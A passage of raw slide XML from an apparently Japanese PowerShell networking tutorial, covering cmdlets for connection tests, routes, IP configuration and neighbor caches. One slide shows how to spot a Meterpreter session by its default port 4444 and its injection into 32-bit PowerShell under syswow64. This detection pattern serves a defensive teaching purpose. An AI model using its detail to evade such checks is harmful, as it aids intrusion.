                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>tnc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 10.10.0.1 -Port 445</a:t>
            </a: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1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a: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TcpTestSucceeded</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : True</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F5BDBD77-5DD7-5AEA-9655-B7756A746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6642" y="4552145"/>
            <a:ext cx="2869718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経路を確認する。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25965707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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| L4 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>接続確認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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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21</a:t>
            </a:fld>
            <a:endParaRPr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47E1F5B-D1A4-8242-8037-0EFBFD4E3535}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="870901" y="1700808"/>
            <a:ext cx="10430125" cy="2708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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetTCPConnection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemotePort</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 4444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Select-Object -Property </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, State, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OwningProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>,</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&gt; @{Name = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ProcessPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>' </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&gt;   Expression = {(Get-Process -Id $_.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>OwningProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>).Path }}</a:t>
            </a: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RemoteAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : 10.10.75.1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State         : Established</a:t>
            </a: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OwningProcess</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> : 7292</a:t>
            </a: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ProcessPath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   : C:\WINDOWS\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>syswow64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>\WindowsPowerShell\v1.0\powershell.exe</a:t>
            </a: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CAA53661-90B3-D008-C0A5-4C0BD3926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20" y="935432"/>
            <a:ext cx="4788532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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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NetTCPConnection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092AF9A8-14B3-7759-782C-52A553D85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1304764"/>
            <a:ext cx="10440989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4444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番ポートに接続しているプロセスを、パス付きで表示する。</a:t>
            </a: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BE284B63-9AFE-D04C-C18A-F7C089980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4509120"/>
            <a:ext cx="10424728" cy="113107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4444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番ポートは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Metasploit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の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Meterpreter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モジュールの既定ポート。</a:t>
            </a:r>
          </a:p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Meterpreter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は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32bit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版の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PowerShell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に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DLL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をインジェクションするので、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ja-JP" altLang="en-US" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>パスが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C:\WINDOWS\SYSTEM32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ではなく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syswow64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になっている。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31470482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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| L3</a:t>
            </a:r>
            <a:endParaRPr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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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22</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D71EDE3A-FA5D-751E-72D1-526A532D1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32850"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8652285" y="944724"/>
          <a:ext cx="2662358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2358">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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NetTCPIP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14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Get-</a:t>
                      </a:r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NetRoute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033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Find-</a:t>
                      </a:r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NetRoute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6919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i="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Get-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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NetIPAddress</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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44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i="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Get-</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2000" i="0" dirty="0" err="1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NetIPConfiguration</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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097508"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1488ECC2-2765-1E2F-A197-27F33CF68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20" y="935432"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Find-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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NetRoute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D3526583-8AA6-D1CC-5A7D-1850D30CE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9" y="1306687"/>
            <a:ext cx="7631970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特定の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IP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アドレスに対して使われる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NIC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を表示する。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2F118B0-D1F2-6DE7-48EA-D154C48F331F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1664804"/>
            <a:ext cx="7631970" cy="1938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Find-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetRoute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>RemoteIPAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 172.31.8.254</a:t>
            </a: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IPAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>       : 172.31.8.1</a:t>
            </a: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InterfaceIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  : 19</a:t>
            </a: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InterfaceAlias</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  : VMware Network Adapter VMnet8</a:t>
            </a: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AddressFamily</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>   : IPv4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .</a:t>
            </a:r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65F7E02B-CA79-F0B5-6E65-33C43FF08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20" y="3825044"/>
            <a:ext cx="4860218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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>NetIPConfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRP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D25215D9-B266-D040-6CE8-4EF3D5FB345A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="876298" y="4225793"/>
            <a:ext cx="10440989" cy="2123658"/>
            <a:chOff x="876298" y="1362254"/>
            <a:chExt cx="10440989" cy="2123658"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="AutoShape 3">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29D88D54-5936-2039-794B-14BE15F5ED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298" y="1362254"/>
              <a:ext cx="10440989" cy="33855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ja-JP"/>
              </a:defPPr>
              <a:lvl1pPr marL="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lvl="0" indent="-342900" algn="just">
                <a:spcBef>
                  <a:spcPts val="900"/>
                </a:spcBef>
                <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
                <a:buChar char="l"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>ipconfig</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>に近い結果を表示するが、</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>MAC</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>アドレス情報は既定では未表示。</a:t>
              </a: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F20B9B30-EB5E-6303-CFB3-85AEC1F94F2E}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="884991" y="1700808"/>
              <a:ext cx="9531489" cy="17851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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; Get-</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>NetIPConfiguration</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> –All</a:t>
              </a:r>
              <a:br>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
              </a:br>
              <a:br>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
              </a:br>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>. . .</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>InterfaceDescription</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> : Realtek PCIe GbE Family Controller #2</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>NetProfile.Name</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>      : Klingon</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>IPv6Address          : 240d:1a:3cd:1f00:b8de:9c62:c27d:5950</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>. . 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45556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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| L2</a:t>
            </a:r>
            <a:endParaRPr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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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23</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="2" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61018E5C-8A96-8714-DA0A-555F6AD7E9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701265"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="9120336" y="4822856"/>
          <a:ext cx="2196952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952">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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NetTCPIP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14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Get-</a:t>
                      </a:r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NetAdapter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757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Get-</a:t>
                      </a:r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NetNeighbor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370361"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0D0E16E-E4BD-B782-AE70-CAB4CBB88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20" y="4830254"/>
            <a:ext cx="3671890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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" panose="020B0604030504040204" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2400" b="1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NetNeighbor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4" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BAF08AEB-325C-E60A-62C6-4C5C1FD73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9" y="5200164"/>
            <a:ext cx="7451950" cy="677108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 err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>netsh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 interface ipv4[ipv6] show neighbors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に相当。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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>IPv4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でいうと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ARP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キャッシュを表示する。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B831455-AC3E-8582-CF4A-28F25B0C5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20" y="940597"/>
            <a:ext cx="4860218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+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>▍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-TW" sz="2400" b="1" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="游ゴシック" panose="020B0400000000000000" pitchFamily="50" charset="-128"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>NetIPConfiguration</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2400" b="1" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
            </a:endParaRPr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7738EC03-DA04-9990-7D55-50DDF2A5668E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="876298" y="1341346"/>
            <a:ext cx="10440989" cy="2431435"/>
            <a:chOff x="876298" y="1362254"/>
            <a:chExt cx="10440989" cy="2431435"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="18" name="AutoShape 3">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EF67092-FB57-783D-ED1B-590B9A380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298" y="1362254"/>
              <a:ext cx="10440989" cy="33855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ja-JP"/>
              </a:defPPr>
              <a:lvl1pPr marL="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lvl="0" indent="-342900" algn="just">
                <a:spcBef>
                  <a:spcPts val="900"/>
                </a:spcBef>
                <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
                <a:buChar char="l"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>Calculated Properties</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>で</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>MAC</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ja-JP" altLang="en-US" sz="2200" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
                </a:rPr>
                <a:t>アドレスを表示する。</a:t>
              </a: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D2FC9757-E5D8-428A-60F3-C379E10596B6}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="884991" y="1700808"/>
              <a:ext cx="10430709" cy="209288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r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt; </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>gip</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> | Select-Object </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
